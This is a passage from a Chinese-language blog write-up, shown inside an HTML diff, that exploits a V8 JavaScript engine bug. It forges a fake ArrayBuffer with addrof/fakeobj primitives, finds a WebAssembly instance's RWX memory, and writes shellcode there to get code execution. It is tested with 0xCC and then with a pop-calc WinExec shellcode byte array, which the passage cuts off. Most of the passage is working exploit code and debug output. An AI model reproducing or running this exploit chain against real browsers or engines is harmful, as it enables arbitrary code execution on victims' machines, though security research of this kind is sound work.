+  <span class="nx">double_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">len</span><span class="p">))</span>
+  <span class="c1">// [MaxByteLengthLow, MaxByteLengthHigh]</span>
+  <span class="nx">double_arr</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">len</span><span class="p">))</span>
+  <span class="c1">// [BackingStoreLow, BackingStoreHigh]</span>
+  <span class="nx">double_arr</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">))</span>
+
+  <span class="nx">addr_fake_arr_buf_end</span> <span class="o">=</span> <span class="nx">addr_double_arr_begin</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">double_arr</span><span class="p">);</span>
+  <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">double_arr</span><span class="p">);</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">addr_fake_arr_buf_end</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>
+	<span class="c1">// 7个元素的double数组, sizeof(ArrayBuffer)仅占6个，在Array和ArrayBuffer，有4字节大小的冗余空间没有使用</span>
+	<span class="c1">// sizeof(ArrayBuffer) + 4</span>
+  <span class="nx">addr_fake_arr_buf_begin</span> <span class="o">=</span> <span class="nx">addr_fake_arr_buf_end</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x30</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">);</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">addr_fake_arr_buf_begin</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+  <span class="k">return</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr_fake_arr_buf_begin</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nx">fake_buf_0_3000</span> <span class="o">=</span> <span class="nx">fake_array_buffer</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3000</span><span class="p">);</span>
+<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">fake_buf_0_3000</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>运行结果如下：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x026c0804b331 &lt;JSArray[7]&gt;
+804b331
+804b2fd
+0x026c0804b2fd &lt;ArrayBuffer map <span class="o">=</span> 0000026C08203271&gt;
+</code></pre></div></div>
+
+<p>创建出对应的 <code class="language-plaintext highlighter-rouge">Uint8Array</code>。</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">view</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">fake_buf_0_3000</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>调试运行，发生异常：</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#
+# Fatal error in , line 0
+# Check failed: 0 == array_buffer-&gt;byte_length().
+#
+#
+#
+#FailureMessage Object: 000000792BFFDD40
+</span><span class="o">====</span> <span class="n">C</span> <span class="n">stack</span> <span class="n">trace</span> <span class="o">===============================</span>
+
+<span class="n">v8</span><span class="o">::</span><span class="n">base</span><span class="o">::</span><span class="n">debug</span><span class="o">::</span><span class="n">StackTrace</span><span class="o">::</span><span class="n">StackTrace</span> <span class="p">[</span><span class="mh">0x00007FF605911A5B</span><span class="o">+</span><span class="mi">27</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">MSI</span><span class="o">-</span><span class="n">NB</span><span class="err">\</span><span class="n">workspace</span><span class="err">\</span><span class="n">depot_tools</span><span class="err">\</span><span class="n">chromium</span><span class="err">\</span><span class="n">v8</span><span class="err">\</span><span class="n">src</span><span class="err">\</span><span class="n">base</span><span class="err">\</span><span class="n">debug</span><span class="err">\</span><span class="n">stack_trace_win</span><span class="p">.</span><span class="n">cc</span><span class="o">:</span><span class="mi">173</span><span class="p">)</span>
+<span class="n">v8</span><span class="o">::</span><span class="n">platform</span><span class="o">::</span><span class="err">`</span><span class="n">anonymous</span> <span class="k">namespace</span><span class="err">'</span><span class="o">::</span><span class="n">PrintStackTrace</span> <span class="p">[</span><span class="mh">0x00007FF6058AF237</span><span class="o">+</span><span class="mi">39</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">MSI</span><span class="o">-</span><span class="n">NB</span><span class="err">\</span><span class="n">workspace</span><span class="err">\</span><span class="n">depot_tools</span><span class="err">\</span><span class="n">chromium</span><span class="err">\</span><span class="n">v8</span><span class="err">\</span><span class="n">src</span><span class="err">\</span><span class="n">libplatform</span><span class="err">\</span><span class="k">default</span><span class="o">-</span><span class="n">platform</span><span class="p">.</span><span class="n">cc</span><span class="o">:</span><span class="mi">28</span><span class="p">)</span>
+<span class="n">V8_Fatal</span> <span class="p">[</span><span class="mh">0x00007FF6058A7FE9</span><span class="o">+</span><span class="mi">217</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">MSI</span><span class="o">-</span><span class="n">NB</span><span class="err">\</span><span class="n">workspace</span><span class="err">\</span><span class="n">depot_tools</span><span class="err">\</span><span class="n">chromium</span><span class="err">\</span><span class="n">v8</span><span class="err">\</span><span class="n">src</span><span class="err">\</span><span class="n">base</span><span class="err">\</span><span class="n">logging</span><span class="p">.</span><span class="n">cc</span><span class="o">:</span><span class="mi">166</span><span class="p">)</span>
+<span class="n">v8</span><span class="o">::</span><span class="n">internal</span><span class="o">::</span><span class="n">Runtime_GrowableSharedArrayBufferByteLength</span> <span class="p">[</span><span class="mh">0x00007FF60539CF3C</span><span class="o">+</span><span class="mi">540</span><span class="p">]</span> <span class="p">(</span><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">MSI</span><span class="o">-</span><span class="n">NB</span><span class="err">\</span><span class="n">workspace</span><span class="err">\</span><span class="n">depot_tools</span><span class="err">\</span><span class="n">chromium</span><span class="err">\</span><span class="n">v8</span><span class="err">\</span><span class="n">src</span><span class="err">\</span><span class="n">runtime</span><span class="err">\</span><span class="n">runtime</span><span class="o">-</span><span class="n">typedarray</span><span class="p">.</span><span class="n">cc</span><span class="o">:</span><span class="mi">56</span><span class="p">)</span>
+<span class="p">(</span><span class="n">No</span> <span class="n">symbol</span><span class="p">)</span> <span class="p">[</span><span class="mh">0x0000039A000BDFDC</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>根据异常日志和调用栈，定位到如下函数：</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">RUNTIME_FUNCTION</span><span class="p">(</span><span class="n">Runtime_GrowableSharedArrayBufferByteLength</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">HandleScope</span> <span class="n">scope</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
+  <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">length</span><span class="p">());</span>
+  <span class="n">CONVERT_ARG_HANDLE_CHECKED</span><span class="p">(</span><span class="n">JSArrayBuffer</span><span class="p">,</span> <span class="n">array_buffer</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+  <span class="n">CHECK_EQ</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">array_buffer</span><span class="o">-&gt;</span><span class="n">byte_length</span><span class="p">());</span> <span class="c1">// ==&gt; 这个检查没有通过</span>
+  <span class="kt">size_t</span> <span class="n">byte_length</span> <span class="o">=</span> <span class="n">array_buffer</span><span class="o">-&gt;</span><span class="n">GetBackingStore</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">byte_length</span><span class="p">();</span>
+  <span class="k">return</span> <span class="o">*</span><span class="n">isolate</span><span class="o">-&gt;</span><span class="n">factory</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewNumberFromSize</span><span class="p">(</span><span class="n">byte_length</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>把 ByteLength 改成 0 后，<code class="language-plaintext highlighter-rouge">GetBackingStore()</code> 中又会触发其他异常，有必要深入分析一下这个函数的逻辑。分析正常的 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 访问流程作为参照，发现程序是不会走到<code class="language-plaintext highlighter-rouge">Runtime_GrowableSharedArrayBufferByteLength</code> 的。推测是填 0 处理隐藏了真正的错误，把之前填 0 的地方全都填上了 0xCC 再运行脚本，发现问题解决了，不再出现异常了。</p>
+
+<p>执行 <code class="language-plaintext highlighter-rouge">view[0] = 0xAA;</code>，触发了 0x0 地址访问异常，证明我们伪造的 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 可以正常使用了。</p>
+
+<h3 id="代码执行">代码执行</h3>
+
+<p>接下来就可以实现代码执行了。代码执行的实现，分成下面几个步骤：</p>
+
+<ul>
+  <li>创建 <a href="https://developer.mozilla.org/zh-CN/docs/WebAssembly/Concepts">WebAssembly</a> 实例</li>
+  <li>读取 WASM 模块导出函数所在 RWX 内存区的地址</li>
+  <li>利用任意地址读写能力，将 shellcode 写入可执行的内存</li>
+  <li>调用 WASM 导出函数，触发 shellcode 执行</li>
+</ul>
+
+<p>使用在线工具 <a href="https://wasdk.github.io/WasmFiddle/">WasmFiddle</a>，获取 WASM 字节码。用下面的代码实例化 WASM 模块：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">wasmCode</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
+<span class="kd">var</span> <span class="nx">wasmModule</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasmCode</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">wasmInstance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasmModule</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>在源码中符串搜索，可以找到找到了 WebAssembly 编译执行中用到的两个关键函数<code class="language-plaintext highlighter-rouge">WebAssemblyModule</code> 和 <code class="language-plaintext highlighter-rouge">WebAssemblyInstance</code>。调试这两个函数, 最后找到<code class="language-plaintext highlighter-rouge">WasmInstanceObject</code> 对象的 <code class="language-plaintext highlighter-rouge">kJumpTableStartOffset</code> (<code class="language-plaintext highlighter-rouge">0x00000068</code>) 偏移处存放了 RWX 内存区的地址。</p>
+
+<p>读出 <code class="language-plaintext highlighter-rouge">WasmInstanceObject</code> 对象中存储的 RWX 内存区地址：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">wasmCode</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span><span class="p">]);</span>
+<span class="kd">var</span> <span class="nx">wasmModule</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasmCode</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">wasmInstance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasmModule</span><span class="p">);</span>
+
+<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">wasmInstance</span><span class="p">);</span>
+<span class="nx">instance_start</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">wasmInstance</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">instance_start</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">instruction_ptr</span> <span class="o">=</span> <span class="nx">instance_start</span> <span class="o">+</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x68</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">instruction_ptr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">fake_fixed_array_ptr</span> <span class="o">=</span> <span class="nx">instruction_ptr</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span>
+
+<span class="nx">buf_for_fake_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">]</span>
+<span class="c1">// [double_array_map, props]</span>
+<span class="nx">buf_for_fake_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">make_qword</span><span class="p">(</span><span class="nx">double_array_map</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
+<span class="c1">// [elems, len]</span>
+<span class="nx">buf_for_fake_arr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">make_qword</span><span class="p">(</span><span class="nx">fake_fixed_array_ptr</span><span class="p">,</span> <span class="mi">8</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">));</span>
+
+<span class="nx">start_ptr_of_fake_arr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf_for_fake_arr</span><span class="p">)</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mh">0x10</span><span class="p">);</span>
+<span class="nx">instruction_ptr_reader</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">start_ptr_of_fake_arr</span><span class="p">);</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">instruction_ptr_reader</span><span class="p">[</span><span class="mi">0</span><span class="p">]).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>输出：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x02f8081d4ba1 &lt;Instance map <span class="o">=</span> 000002F808206F61&gt;
+81d4ba1
+81d4c09
+be50a41000
+</code></pre></div></div>
+
+<p>伪造 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>，把 shellcode 拷贝到 <code class="language-plaintext highlighter-rouge">be50a41000</code>，再调用 WebAssembly 块导出的 <code class="language-plaintext highlighter-rouge">main</code> 函数，实际上执行的就是 shellcode 了。</p>
+
+<p>用 0xCC 作为 shellcode 验证效果：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">instruction_ptr</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">instruction_ptr_reader</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">instruction_ptr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="nx">shellcode_zone</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">fake_array_buffer</span><span class="p">(</span><span class="nx">instruction_ptr</span><span class="p">,</span> <span class="mi">1</span><span class="p">));</span>
+<span class="nx">shellcode_zone</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xcc</span><span class="p">;</span>
+
+<span class="nx">wasmInstance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>成功执行到0xCC，触发中断。</p>
+
+<p><img src="/assets/images/Pasted image 20220224014552.png" alt="" /></p>
+
+<p>从 <a href="https://github.com/boku7/x64win-DynamicNoNull-WinExec-PopCalc-Shellcode">github</a> 找了一个弹计算器的shellcode, 把 c 代码部分编译成 exe，然后后用
+ida 提取出 shellcode。</p>
+
+<p><img src="/assets/images/Pasted image 20220224221352.png" alt="" /></p>
+
+<p>毕竟是网上找的 shellcode，先单步调试一遍的，验证安全性。在数组开头加上 0xCC，便于调试。</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">shellcode_zone</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">fake_array_buffer</span><span class="p">(</span><span class="nx">instruction_ptr</span><span class="p">,</span> <span class="mi">1024</span><span class="p">));</span>
+
+<span class="nx">shellcode_src</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint8Array</span><span class="p">([</span><span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xF7</span><span class="p">,</span> <span class="mh">0xE7</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span>
+  <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span>
+  <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span>
+  <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span>
+  <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xC1</span><span class="p">,</span> <span class="mh">0xE9</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span>
+  <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x0B</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xD2</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x1C</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC2</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xDB</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC3</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xE4</span><span class="p">,</span> <span class="mh">0x44</span><span class="p">,</span>
+  <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x4D</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">,</span> <span class="mh">0xEB</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span>
+  <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xC0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xE2</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x0C</span><span class="p">,</span>
+  <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xFF</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x8B</span><span class="p">,</span> <span class="mh">0x3C</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x4C</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span>
